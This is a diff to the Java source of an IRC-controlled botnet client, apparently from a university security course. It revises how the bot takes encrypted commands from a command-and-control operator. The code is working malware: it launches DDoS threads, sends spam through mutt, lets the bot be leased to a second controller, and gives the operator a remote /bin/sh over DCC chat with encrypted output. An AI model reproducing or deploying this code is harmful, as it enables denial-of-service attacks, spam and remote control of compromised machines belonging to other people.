@@ -1,14 +1,6 @@
 import java.io.*;
 import java.net.*;
-import java.security.Key;
 import java.util.*;
-
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
-import javax.crypto.spec.SecretKeySpec;
-import javax.mail.*;
-import javax.mail.internet.*;
-
 import org.jibble.pircbot.*;
 
 
@@ -25,8 +17,7 @@ public class BotnetClient extends PircBot {
 	private static final List<String> SAFE_COMMANDS =  Arrays.asList(new String[] {"help", "names", "ddos", "spam", "spamupload"});
 	
 	private static final String SENTINEL = "$: ";
-	private static final String TERMINATION = "exit";
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = false;
 	private static final String SERVER = "eve.cs.washington.edu";
 	private static final String CHANNEL = "#hacktastic";
 	private static final String NAME = "bot";
@@ -49,7 +40,7 @@ public class BotnetClient extends PircBot {
 	private MsgEncrypt leasedM; // This will be set to null when time is up
 	
 	public static void main(String[] args) {
-		BotnetClient bn = new BotnetClient();
+		new BotnetClient();
 	}
 	
 	public BotnetClient() {
@@ -101,23 +92,22 @@ public class BotnetClient extends PircBot {
 			leasedM = null;
 			leaseMaster = null;
 		}
-		String decMsg = m.decryptMsg(message);
-		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
-		if (sender.equals(CC) && COMMANDS.contains(decMsg.split(" ")[0])) {
+		String decMsg = m.decryptMsgNonce(message);
+		String leasedDecMsg = leased ? leasedM.decryptMsgNonce(message) : null;
+		String command = decMsg != null && decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
+		String leasedCommand = leasedDecMsg != null && leasedDecMsg.split(" ").length > 0 ? leasedDecMsg.split(" ")[0] : leasedDecMsg;
+		
+		if (sender.equals(CC) && COMMANDS.contains(command)) {
 			runCommand(decMsg, hostname, sender);
-		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedDecMsg.split(" ")[0])) {
+		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedCommand)) {
 			runCommand(leasedDecMsg, hostname, sender);
-		} else { // TODO: use leasing here??
+		} else {
 			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 		}
 	}
 	
 	private boolean runCommand(String message, String hostname, String sender) {
-		System.out.println(sender + ": " + message);
 		try {
-			// TODO: maybe need to put this back
-			//System.out.println(message);
-			//System.out.println(message);
 			if (message.toLowerCase().startsWith("spam")) {
 				String[] parts = message.split("'");
 				if (parts.length < 9) {
@@ -151,29 +141,11 @@ public class BotnetClient extends PircBot {
 				}
 				return true;
 			} else if (message.toLowerCase().startsWith("ddos")) {
-				System.out.println(sender + ": " + message);
 				String[] parts = message.split(" ");
 				if (parts.length < 4) {
 					System.out.println("Bad ddos message provided");
 				} else {
 					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
-				}
-				return true;
-			} else if (message.toLowerCase().startsWith("lease")) {
-				String[] parts = message.split(" ");
-				if (parts.length > 4) {
-					String leaseMaster = parts[1];
-					long duration = Long.parseLong(parts[2]);
-					String mod = parts[3];
-					String exp = parts[4];
-					leaseTerminateTime = System.currentTimeMillis() + duration;
-					leased = true;
-					this.leaseMaster = leaseMaster;
-					leasedM = MsgEncrypt.getInstance();
-					leasedM.genRSAPubKey(mod + " " + exp);
-					System.out.println("lease to " + leaseMaster + " with " + leasedM.getRSAPub());
-				} else {
-					System.out.println("Failed lease message: " + message);
 				}
 				return true;
 			} else if (message.toLowerCase().startsWith("eradicate")) {
@@ -187,7 +159,6 @@ public class BotnetClient extends PircBot {
 					in.println("./clean.sh >> temp");
 					in.println("exit 0");
 					p.waitFor();
-					System.out.println("ran clean script with exit code " + p.exitValue());
 					System.exit(0);
 				}
 				return true;
@@ -204,7 +175,6 @@ public class BotnetClient extends PircBot {
 	
 	protected void onJoin(String channel, String sender, String login, String hostname) {
 			op(CHANNEL, sender);
-			//deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
 	}
 	
@@ -250,7 +220,6 @@ public class BotnetClient extends PircBot {
 			
 			p.waitFor();
 			
-			System.out.println("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
 			System.out.println("Email sent to" + emails + " with exit code " + p.exitValue());
 			
 		} catch(Exception e) {
@@ -262,73 +231,88 @@ public class BotnetClient extends PircBot {
 		if (chat == null) {
 			System.out.println("Chat failed, passed null.");
 		} else {
-			System.out.println("chat sender: " + chat.getNick());
 			try {
 				if (!chat.getNick().equalsIgnoreCase(CC) && !chat.getNick().equalsIgnoreCase(leaseMaster)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else { 
 					chat.accept();
 					String command = chat.readLine();
-					String commandRSA = m.decryptRSA(command);
-					String leasedCommandRSA = leasedM.decryptRSA(command);
-					if (commandRSA.startsWith("key")) {
-						String otherKey = m.decryptRSA(chat.readLine());
-						String info = m.decryptRSA(chat.readLine());
-						m.setPubParams(info);
-						m.handShake(otherKey);
-						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+					if (command.equals("nonce")) {
+						chat.sendLine(m.getNonce() + "");
 						chat.close();
-					} else if (leased && leasedCommandRSA.startsWith("key")) {
-						System.out.println("Handshaking with leaseMaster");
-						String otherKey = leasedM.decryptRSA(chat.readLine());
-						String info = leasedM.decryptRSA(chat.readLine());
-						leasedM.setPubParams(info);
-						leasedM.handShake(otherKey);
-						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+					} else if (command.equals("leasednonce")) {
+						chat.sendLine(leasedM.getNonce() + "");
 						chat.close();
-					} else if (m.decryptMsg(command).startsWith("shell")) {
-						//Create the bash shell
-						Runtime r = Runtime.getRuntime();
-						Process p = r.exec("/bin/sh");
-	
-						//Gather the input/output stream to the bash shell process
-						PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
-						BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
-						BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-						
-						//Send input commands to the process in a separate thread
-						ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
-						inputThread.start();
-						
-						ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
-						errorThread.start();
-						
-			        	//print the results only
-		        		while (inputThread.isAlive()) {
-		        			String s = bashout.readLine();
-		        			while (s != null && !s.equals(SENTINEL)) {
-		        				// TODO: maybe need to change this
-		        				//System.out.println(s);
-		        				//String encS = startMsgE.encryptMsg(s);
-		        				//System.out.println(encS);
-		        				//chat.sendLine(encS);
-		        				//chat.sendLine(s);
-		        				String encM = m.encryptMsg(s);
-		        				chat.sendLine(encM);
-		        				System.out.println("bash response: " + s + "\n\tE(m): " + encM);
-		        				s = bashout.readLine();
-		        			}
-		        			//chat.sendLine(s);
-		        			chat.sendLine(m.encryptMsg(s));
-		        			//System.out.println(s);
-		        			//System.out.println(startMsgE.encryptMsg(s));
-		        			//chat.sendLine(startMsgE.encryptMsg(s));
-		        		}
-			        	chat.close();
-			        	inputThread.kill();
-			        	errorThread.kill();
-			        	p.destroy();
-					    System.out.println("Closed the bash shell");
+					} else {
+						String commandRSA = m.decryptRSA(command);
+						String leasedCommandRSA;
+						if (leased) {
+							leasedCommandRSA = leasedM.decryptRSA(command);
+						} else {
+							leasedCommandRSA = null;
+						}
+						if (commandRSA != null && commandRSA.startsWith("key")) {
+							String otherKey = m.decryptRSA(chat.readLine());
+							String info = m.decryptRSA(chat.readLine());
+							m.setPubParams(info);
+							m.handShake(otherKey);
+							chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+							chat.close();
+						} else if (leased && leasedCommandRSA.startsWith("key")) {
+							String otherKey = leasedM.decryptRSA(chat.readLine());
+							String info = leasedM.decryptRSA(chat.readLine());
+							leasedM.setPubParams(info);
+							leasedM.handShake(otherKey);
+							chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+							chat.close();
+						} else if (m.decryptMsgNonce(command).startsWith("leasekey")) {
+							String leaseMaster = m.decryptMsgNonce(chat.readLine());
+							long duration = Long.parseLong(m.decryptMsg(chat.readLine()));
+							String unenc = chat.readLine();
+							String leasedPublicInfo = m.decryptMsg(unenc);
+							leaseTerminateTime = System.currentTimeMillis() + duration;
+							leased = true;
+							this.leaseMaster = leaseMaster;
+							leasedM = MsgEncrypt.getInstance();
+							leasedM.genRSAPubKey(leasedPublicInfo);
+							chat.sendLine(m.encryptMsg("leased"));
+							chat.close();
+						} else if (m.decryptMsgNonce(command).startsWith("shell")) {
+							//Create the bash shell
+							Runtime r = Runtime.getRuntime();
+							Process p = r.exec("/bin/sh");
+		
+							//Gather the input/output stream to the bash shell process
+							PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
+							BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
+							BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+							
+							//Send input commands to the process in a separate thread
+							ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
+							inputThread.start();
+							
+							ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
+							errorThread.start();
+							
+				        	//print the results only
+			        		while (inputThread.isAlive()) {
+			        			String s = bashout.readLine();
+			        			while (s != null && !s.equals(SENTINEL)) {
+			        				String encM = m.encryptMsg(s);
+			        				chat.sendLine(encM);
+			        				System.out.println("bash response: " + s + "\n\tE(m): " + encM);
+			        				s = bashout.readLine();
+			        			}
+			        			if (s != null) {
+			        				chat.sendLine(m.encryptMsg(s));
+			        			}
+			        		}
+				        	chat.close();
+				        	inputThread.kill();
+				        	errorThread.kill();
+				        	p.destroy();
+						    System.out.println("Closed the bash shell");
+						}
 					}
 				}
 			} catch(Exception e) {
@@ -403,21 +387,12 @@ public class BotnetClient extends PircBot {
 	    public void run() {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
-		    	// TODO: make decrypted
-	    		//String encCommand = chat.readLine();
-	    		//String command = startMsgE.decryptMsg(encCommand);
-	    		//System.out.println(encCommand);
-	    		//System.out.println(command);
-	    		//String command = chat.readLine();
-	        	String command = m.decryptMsg(chat.readLine());
+	        	String command = m.decryptMsgNonce(chat.readLine());
 	    		while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		//command = chat.readLine();
-	        		command = m.decryptMsg(chat.readLine());
-	        		//encCommand = chat.readLine();
-	        		//command = startMsgE.decryptMsg(encCommand);
+	        		command = m.decryptMsgNonce(chat.readLine());
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
@@ -451,7 +426,6 @@ public class BotnetClient extends PircBot {
 	        		if (s != null) {
 	        			String encM = m.encryptMsg(s);
 	        			System.out.println("error: " + s + "\n\tE(m): " + encM);
-	        			//chat.sendLine(s);
 	        			chat.sendLine(encM);
 	        		}
 	        	}
